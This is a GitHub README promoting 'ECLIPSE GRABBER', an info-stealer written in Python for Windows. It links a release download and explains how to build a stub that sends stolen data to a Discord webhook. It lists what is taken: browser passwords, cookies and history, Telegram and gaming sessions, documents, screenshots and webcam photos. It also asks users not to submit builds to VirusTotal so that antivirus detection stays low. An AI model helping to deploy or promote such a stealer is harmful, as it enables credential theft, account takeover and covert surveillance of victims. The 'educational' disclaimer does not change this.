<a id ="up"></a>
![LOGO](Images_GitHub/pxfulllogo.jpg)
<img src="https://img.shields.io/badge/Python-FFD43B?style=for-the-badge&logo=python&logoColor=blue">
<img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
<img src="https://img.shields.io/badge/tests-100/100-76B900?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/platform-windows-989898?style=for-the-badge&logo=&logoColor=whit">


Stealer written in Python.
[Download the latest release](https://github.com/SMDXGitHub/ECLIPSE-GRABBER/releases/tag/ECLIPSE)

**Huge Update Released on April 12th**

⭐Please, star this repo if it was helpful⭐

***
### ⛔Disclaimer⛔

I, the creator, am __NOT__ responsible for any actions, and or damages, caused by this software. You __BEAR__ the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's main purpose is __NOT__ to be used maliciously, or on any system that you do not own, or have the right to use. __By using this software, you automatically agree to the above.__

---
### ❗❗Request❗❗

__Don't upload builded stealer to Virustotal__. The more often you upload it, the more and faster antiviruses begin to recognize its signature.

---
### 🔨Builder

__You will need to download Python 3.0 or above. You can download Python [here]([https://www.python.org/downloads/])
After that run the .bat file to assemble the Builder. Next, you will need to set-up a Discord webhook. You can learn how to do it right [here]([https://youtu.be/fKksxz2Gdnc]) Paste the webhook inside and choose your .ico and bot name. (Webhook can be changed in "configure" but you will need to build a new stub!)__

![LOGO](Images_GitHub/builder.png)


### ❕❕Data Grabbed❕❕
* ✅System info
    * ⌚Time
    * 💻OS
    * 🔩CPU
        * 📜Cores
        * 📜CPU frequency
    * 📡IP
    * 📡Location
    * 💽RAM
        * 💾Available
        * 💾Used
    * 📜PC name
    * 💽Discs
        * 📜volumes
        * 💾All Memory
        * 💾Available
        * 💾Used
        * 📜File system type
    * 🧪Antiviruses
    * 🎥GPU
        * 🔩Type
        * 💾All memory in the GPU
        * 💾Free memory in the GPU
        * 📜Graphics card temperature
    * 📠Processes
* ✅Files .txt and .docx
    * 📝in Desktop
    * 📝in Documents
    * 📝in Downloads
* ✅Telegram sessions
* ✅Steam, Epic Games sessions
* ✅Browsers
    * 🔗Chrome
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
    * 🔗Firefox
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
    * 🔗Opera
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
* ✅Other
    * 📸Sreenshot
    * 📸Camera photo
---


---
### ❌Builder errors

If you have error like this:

![error](Images_GitHub/error.png)

How to solve it read [here](https://www.stechies.com/pip-not-recognized-internal-external-command/)

---
### 🧾Results(logs)
![LOGO](Images_GitHub/example.png)

![LOGO](Images_GitHub/example2.png)



---
### 📲Contacts
open [issues](https://github.com/SMDXGitHub/ECLIPSE-GRABBER/issues) or [pull requests](https://github.com/SMDXGitHub/ECLIPSE-GRABBER/pulls)

or 

<a href="https://github.com/SMDXGithub"><img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white"></a>
   <a href="https://discord.gg/4N4VAH8TNz/"><img src="https://img.shields.io/badge/Discord-003E54?style=for-the-badge&logo=Discord&logoColor=white"></a>
---
[go up](#up)
